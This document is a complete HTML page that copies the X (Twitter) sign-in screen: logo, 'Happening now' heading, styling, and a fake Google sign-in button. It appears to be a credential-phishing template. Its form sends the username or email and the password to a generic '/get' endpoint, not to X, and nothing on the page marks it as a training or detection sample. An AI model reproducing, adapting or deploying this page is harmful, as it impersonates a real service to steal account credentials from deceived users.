<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{width:100%;max-width:400px;text-align:center}
.logo{margin-bottom:24px}
.logo svg{width:40px;height:40px}
h1{font-size:28px;font-weight:800;color:#fff;margin-bottom:24px}
.form-group{margin-bottom:14px;text-align:left}
.form-group label{display:block;font-size:13px;color:#71767b;margin-bottom:4px}
.form-group input{width:100%;padding:16px;border:1px solid #333;border-radius:4px;background:#000;color:#fff;font-size:16px;outline:none}
.form-group input:focus{border-color:#1d9bf0}
.btn{width:100%;padding:16px;background:#fff;color:#000;border:none;border-radius:50px;font-size:17px;font-weight:700;cursor:pointer;margin-top:8px;transition:opacity .2s}
.btn:hover{opacity:.9}
.btn:active{transform:scale(0.98)}
.or{margin:20px 0;color:#71767b;font-size:15px}
.google-btn{width:100%;padding:14px;background:transparent;border:1px solid #333;border-radius:50px;color:#fff;font-size:15px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px}
.google-btn:hover{background:#111}
.footer{margin-top:24px;font-size:13px;color:#71767b}
.footer a{color:#1d9bf0;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 40 40" fill="none"><rect width="40" height="40" rx="8" fill="#fff"/><path d="M22.5 17.5L29 10h-2l-5.5 6L18 10h-6l7 10-7 10h2l6-7 5 7h6l-7.5-10.5z" fill="#000"/></svg>
</div>
<h1>Happening now</h1>
<form action="/get" method="POST">
<div class="form-group">
<input name="email" type="text" placeholder="Phone, email, or username" required autocomplete="off">
</div>
<div class="form-group">
<input name="password" type="password" placeholder="Password" required autocomplete="off">
</div>
<button type="submit" class="btn">Sign in</button>
</form>
<div class="or">or</div>
<button class="google-btn">
<svg width="18" height="18" viewBox="0 0 48 48"><path d="M44.5 20H24v8.5h11.8C34.7 33.9 30.1 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.1 0 5.9 1.1 8.1 2.9l6.4-6.4C34.6 4.1 29.6 2 24 2 11.8 2 2 11.8 2 24s9.8 22 22 22c11 0 21-8 21-22 0-1.3-.2-2.7-.5-4z" fill="#FFC107"/></svg>
Sign in with Google
</button>
<div class="footer">
Don't have an account? <a href="#">Sign up</a>
</div>
</div>
</body>
</html>
